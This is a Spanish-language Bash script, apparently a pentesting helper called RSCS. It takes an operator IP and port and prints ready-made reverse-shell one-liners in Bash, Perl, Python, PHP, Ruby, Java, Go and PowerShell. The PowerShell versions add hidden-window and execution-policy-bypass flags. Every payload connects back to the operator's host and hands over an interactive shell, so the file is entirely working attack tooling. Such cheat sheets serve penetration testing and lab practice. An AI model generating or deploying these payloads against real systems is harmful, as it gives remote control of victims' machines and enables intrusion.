#!/usr/bin/env bash

# Made by Nicolas Morales Aka - Harrizzon

export DEBIAN_FRONTEND=noninteractive

# Colors

green="\e[0;32m\033[1m"
end="\033[0m\e[0m"
red="\e[0;31m\033[1m"
blue="\e[0;34m\033[1m"
yellow="\e[0;33m\033[1m"
purple="\e[0;35m\033[1m"
turquois="\e[0;36m\033[1m"
gray="\e[0;37m\033[1m"
bold="\e[1m"
uline="\e[4m"



# SALIR
trap ctrl_c INT

function ctrl_c(){
    clear
    echo -e "\n${red}${bold}[!] ${end}${yellow}Saliendo... ${end}${red}${bold}[!]${end}";sleep 0.2
    echo -e "${blue}Gracias por utilizar${end} ${yellow}${uline}RSCS${end}"
    2>/dev/null
    exit 0

}

function banner(){
    echo -e "${turquois}
                ____  _____ ___________      
               / __ \/ ___// ____/ ___/            
         >    / /_/ /\__ \/ /    \__ \   <        
         >   / _, _/___/ / /___ ___/ /   < 
            /_/ |_|/____/\____//____/    
    "${end}
    echo -e "\t   ${red}>${end}${purple} By: ${end}${yellow}Harrizzon${end}${red} ! <${end}\n"
}



# MAIN
function menu(){
    
    
    
    clear
    opt=0
    
    while [ $opt = 0 ]
    do
        banner
        echo -e "${turquois}1)${end}${yellow} Bash reverse shells${end}"
        echo -e "${turquois}2)${end}${yellow} Perl reverse shells${end}"
        echo -e "${turquois}3)${end}${yellow} Python reverse shells${end}"
        echo -e "${turquois}4)${end}${yellow} PHP reverse shells${end}"
        echo -e "${turquois}5)${end}${yellow} RUBY reverse shells${end}"
        echo -e "${turquois}6)${end}${yellow} JAVA reverse shells${end}"
        echo -e "${turquois}7)${end}${yellow} GO reverse shells${end}"
        echo -e "${turquois}8)${end}${yellow} Powershell reverse shells${end}"
         echo -e "${turquois}9)${end}${yellow} Show All${end}"
        echo -e "${turquois}10)${end}${yellow} Cambiar configuracion${end}"
        read opc
        case $opc in
            1) bashm; opt=1;;
            2) perlm; opt=1;;
            3) pym; opt=1;;
            4) phpm; opt=1;;
            5) rubym; opt=1;;
            6) javam; opt=1;;
            7) gom; opt=1;;
            8) powerm; opt=1;;
            9) showall; opt=1;;
            10) changeip; opt=1;;
            
            *) echo -e "${red}[!]${end} Seleccione una opcion valida ${red}[!]${end}";sleep 1.2; clear
        esac

    done
    
}

function bashm(){
    clear
    echo -e "${yellow}1 » ${end}${green}bash -i >& /dev/tcp/${red}$aipi${end}${green}/${end}${red}$portk${end}${green} 0>&1${end}"

    bk=0
    while [ $bk = 0 ]
    do
        
        

        echo -e "\n${red}[${yellow}·${end}${red}]${end}${end}${blue} Selecciona un numero para copiar${end}"
        echo -e "${red}[${yellow}x${end}${red}]${end}${blue} Back${end} ${red}[<]${end}"
        read opc
        case $opc in
        #1)
        #2)
        x) menu; bk=1;;
        *) echo -e "${red}[!] Selecciona una opcion valida [!]\n"; sleep 1.2; clear; bashm
        esac
    done
}

function perlm(){
    clear
    echo -e "${yellow}1 » ${end}${green}perl -e 'use Socket;"'$i'"""=""\"${red}$aipi${end}${green}\""";"'$p'"=${end}${red}$portk${end}${green};socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in("'$p'",inet_aton("'$i'")))){open(STDIN,"'>&S'");open(STDOUT,"'>&S'");open(STDERR,"'>&S'");exec("'/bin/sh -i'");};'${end}"

    bk=0
    while [ $bk = 0 ]
    do
        
        

        echo -e "\n${red}[${yellow}·${end}${red}]${end}${end}${blue} Selecciona un numero para copiar${end}"
        echo -e "${red}[${yellow}x${end}${red}]${end}${blue} Back${end} ${red}[<]${end}"
        read opc
        case $opc in
        #1)
        #2)
        x) menu; bk=1;;
        *) echo -e "${red}[!] Selecciona una opcion valida [!]\n"; sleep 1.2; clear; perlm
        esac
    done
}

function pym(){
    clear
    echo -e "${yellow}1 » ${end}${green}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${red}$aipi${end}${green}\",${end}${red}$portk${end}${green}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\""/bin/sh\"""",\"-i\"]);'${end}\n"
    echo -e "${yellow}2 » ${end}${green}python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${red}$aipi${end}${green}\",${red}$portk${end}${green}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'${end}"

    bk=0
    while [ $bk = 0 ]
    do
        
        

        echo -e "\n${red}[${yellow}·${end}${red}]${end}${end}${blue} Selecciona un numero para copiar${end}"
        echo -e "${red}[${yellow}x${end}${red}]${end}${blue} Back${end} ${red}[<]${end}"
        read opc
        case $opc in
        #1)
        #2)
        x) menu; bk=1;;
        *) echo -e "${red}[!] Selecciona una opcion valida [!]\n"; sleep 1.2; clear; pym
        esac
    done
}

function phpm(){
    clear
    declare sock='$sock'
    echo -e "${yellow}1 » ${end}${green}php -r "\'$sock"\=fsockopen(\"${red}$aipi${end}${green}\",${end}${red}$portk${end}${green});exec(\"/bin/sh -i <&3 >&3 2>&3\");'${end}\n"
    echo -e "${yellow}2 » ${end}${green}<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/${red}$aipi${end}${green}/${end}${red}$portk${end}${green} 0>&1'\");?>${end}"
    
    bk=0
    while [ $bk = 0 ]
    do
        
        

        echo -e "\n${red}[${yellow}·${end}${red}]${end}${end}${blue} Selecciona un numero para copiar${end}"
        echo -e "${red}[${yellow}x${end}${red}]${end}${blue} Back${end} ${red}[<]${end}"
        read opc
        case $opc in
        #1)
        #2)
        x) menu; bk=1;;
        *) echo -e "${red}[!] Selecciona una opcion valida [!]\n"; sleep 1.2; clear; phpm
        esac
    done
}

function rubym(){
    clear
    echo -e "${yellow}1 » ${end}${green}ruby -rsocket -e'f=TCPSocket.open(\"${red}$aipi${end}${green}\",${end}${red}$portt${end}${green}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'${end}"

    bk=0
    while [ $bk = 0 ]
    do
        
        

        echo -e "\n${red}[${yellow}·${end}${red}]${end}${end}${blue} Selecciona un numero para copiar${end}"
        echo -e "${red}[${yellow}x${end}${red}]${end}${blue} Back${end} ${red}[<]${end}"
        read opc
        case $opc in
        #1)
        #2)
        x) menu; bk=1;;
        *) echo -e "${red}[!] Selecciona una opcion valida [!]\n"; sleep 1.2; clear; rubym
        esac
    done
}

function javam(){
    clear
    declare line='\$line'
    echo -e "${yellow}1 » ${end}${green}\tr = Runtime.getRuntime()${end}"
    echo -e "\t${green}p = r.exec([\"/bin/sh\",\"-c\",\"exec 5<>/dev/tcp/${red}$aipi${end}${green}/${red}$portk${end}${green};cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[])${end}"
    echo -e "\t${green}p.waitFor()${end}"

    bk=0
    while [ $bk = 0 ]
    do
        
        

        echo -e "\n${red}[${yellow}·${end}${red}]${end}${end}${blue} Selecciona un numero para copiar${end}"
        echo -e "${red}[${yellow}x${end}${red}]${end}${blue} Back${end} ${red}[<]${end}"
        read opc
        case $opc in
        #1)
        #2)
        x) menu; bk=1;;
        *) echo -e "${red}[!] Selecciona una opcion valida [!]\n"; sleep 1.2; clear; javam
        esac
    done
}

function gom(){
    clear
    echo -e "${yellow}1 » ${end}${green}echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"${red}$aipi${end}${green}:${end}${red}$portk${end}${green}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go${end}"
    
    bk=0
    while [ $bk = 0 ]
    do
        
        

        echo -e "\n${red}[${yellow}·${end}${red}]${end}${end}${blue} Selecciona un numero para copiar${end}"
        echo -e "${red}[${yellow}x${end}${red}]${end}${blue} Back${end} ${red}[<]${end}"
        read opc
        case $opc in
        #1)
        #2)
        x) menu; bk=1;;
        *) echo -e "${red}[!] Selecciona una opcion valida [!]\n"; sleep 1.2; clear; gom
        esac
    done
}

function powerm(){
    clear
    declare client='$client'
    declare sendbyte='$sendbyte'
    declare stream='$stream'
    declare bytes='$bytes'
    declare data='$data'
    declare sendback2='sendback2'
    declare sendback='$sendback'
    declare i='$i'
    
    echo -e "${yellow}1 » ${end}${green}powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"${red}$aipi${end}${green}\",${red}$portk${end}${green});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()${end}\n"
    echo -e "${yellow}2 » ${end}${green}powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(\"${red}$aipi${end}${green}\",${end}${red}$portk${end}${green});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"${end}\n"

    bk=0
    while [ $bk = 0 ]
    do
        
        

        echo -e "\n${red}[${yellow}·${end}${red}]${end}${end}${blue} Selecciona un numero para copiar${end}"
        echo -e "${red}[${yellow}x${end}${red}]${end}${blue} Back${end} ${red}[<]${end}"
        read opc
        case $opc in
        #1)
        #2)
        x) menu; bk=1;;
        *) echo -e "${red}[!] Selecciona una opcion valida [!]\n"; sleep 1.2; clear; powerm
        esac
    done
}

function changeip(){
    clear
    echo -e "${red}[>] Ingresa tu IP${end}${green}"
    read ipe
    echo -e "${end}${red}[>] Ingresa un puerto${end}${green}"
    read portt
    aipi=$ipe
    portk=$portt
    menu
}

function showall(){
    declare sock='$sock'
    declare line='\$line'
    declare client='$client'
    declare sendbyte='$sendbyte'
    declare stream='$stream'
    declare bytes='$bytes'
    declare data='$data'
    declare sendback2='sendback2'
    declare sendback='$sendback'
    declare i='$i'
    clear
    echo -e "\n${red} > ${yellow}All Reverse Shells ${red}<${end}\n"
    echo -e "${red}${uline}BASH${end}"
    echo -e "${yellow}1 » ${end}${green}bash -i >& /dev/tcp/${red}$aipi${end}${green}/${end}${red}$portk${end}${green} 0>&1${end}\n"
    echo -e "${red}${uline}PERL${end}"
    echo -e "${yellow}2 » ${end}${green}perl -e 'use Socket;"'$i'"""=""\"${red}$aipi${end}${green}\""";"'$p'"=${end}${red}$portk${end}${green};socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in("'$p'",inet_aton("'$i'")))){open(STDIN,"'>&S'");open(STDOUT,"'>&S'");open(STDERR,"'>&S'");exec("'/bin/sh -i'");};'${end}\n"
    echo -e "${red}${uline}PYTHON${end}"
    echo -e "${yellow}3 » ${end}${green}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${red}$aipi${end}${green}\",${end}${red}$portk${end}${green}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\""/bin/sh\"""",\"-i\"]);'${end}\n"
    echo -e "${yellow}4 » ${end}${green}python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${red}$aipi${end}${green}\",${red}$portk${end}${green}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'${end}\n"
    echo -e "${red}${uline}PHP${end}"
    echo -e "${yellow}5 » ${end}${green}php -r "\'$sock"\=fsockopen(\"${red}$aipi${end}${green}\",${end}${red}$portk${end}${green});exec(\"/bin/sh -i <&3 >&3 2>&3\");'${end}\n"
    echo -e "${yellow}6 » ${end}${green}<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/${red}$aipi${end}${green}/${end}${red}$portk${end}${green} 0>&1'\");?>${end}\n"
    echo -e "${red}${uline}RUBY${end}"
    echo -e "${yellow}7 » ${end}${green}ruby -rsocket -e'f=TCPSocket.open(\"${red}$aipi${end}${green}\",${end}${red}$portt${end}${green}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'${end}\n"
    echo -e "${red}${uline}JAVA${end}"
    echo -e "${yellow}8 » ${end}${green}r = Runtime.getRuntime()${end}\n${green}p = r.exec([\"/bin/sh\",\"-c\",\"exec 5<>/dev/tcp/${red}$aipi${end}${green}/${red}$portk${end}${green};cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[])${end}\n${green}p.waitFor()${end}\n"
    echo -e "${red}${uline}GO${end}"
    echo -e "${yellow}9 » ${end}${green}echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"${red}$aipi${end}${green}:${end}${red}$portk${end}${green}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go${end}\n"
    echo -e "${red}${uline}POWERSHELL${end}"
    echo -e "${yellow}10 » ${end}${green}powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"${red}$aipi${end}${green}\",${red}$portk${end}${green});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()${end}\n"
    echo -e "${yellow}11 » ${end}${green}powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(\"${red}$aipi${end}${green}\",${end}${red}$portk${end}${green});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"${end}\n"

    opc=0
    while [ $opc = 0 ]
    do
        echo -e "\n${red}[${yellow}·${end}${red}]${end}${end}${blue} Selecciona un numero para copiar${end}"
        echo -e "${red}[${yellow}x${end}${red}]${end}${blue} Back${end} ${red}[<]${end}"
        read opc
        case $opc in
        #1)
        #2)
        x) menu; bk=1;;
        *) echo -e "${red}\n[!] Selecciona una opcion valida [!]\n"; sleep 1.2; clear; showall
        esac
    done

}
# DEPENDENCIAS

function dependencies(){
    tput civis
    clear; dependecias=(xclip)
    echo -e "\n\t${green}[${red}!${green}] ${yellow}Verificando dependencias en el sistema...${end}"
    sleep 1.5;
    for program in "${dependencias[@]}";do
        echo -ne "\n\t\t${green}[${yellow}>${green}]${end} ${yellow}Herramienta: ${end}${green} $program${green}[${yellow}<${green}]${end}" 
        test -f /usr/bin/$program

        if [ "$(echo $?)" == "0" ];then
            echo -e "${green} (✓)${end}"
        elif [ "$(echo $?)" == "1" ];then
            echo -e "${red} (X)${end}\n"
            echo -e "\t${green}[${yellow}>${green}]${end} ${yellow}Instalando Herramienta:${end}${green} $program${green}[${yellow}<${green}]${end}"
			apt-get install $program -y > /dev/null 2>&1
        else
            echo -e "\n${red}[!] Necesitas ser ROOT. [!]${end}\n"
            exit 1
        fi; sleep 1.1
    done
    echo -e "\n\t  >> Todas las dependencias estan instaladas <<"

}



# FLUJO

clear
declare aipi
declare portk
echo -e "${red}[>] Ingresa tu IP${end}${green}"
read ipe
echo -e "${end}${red}[>] Ingresa un puerto${end}${green}"
read portt
aipi=$ipe
portk=$portt
echo -e "\n${green} [>] Iniciando... [<]${end}";sleep 1;
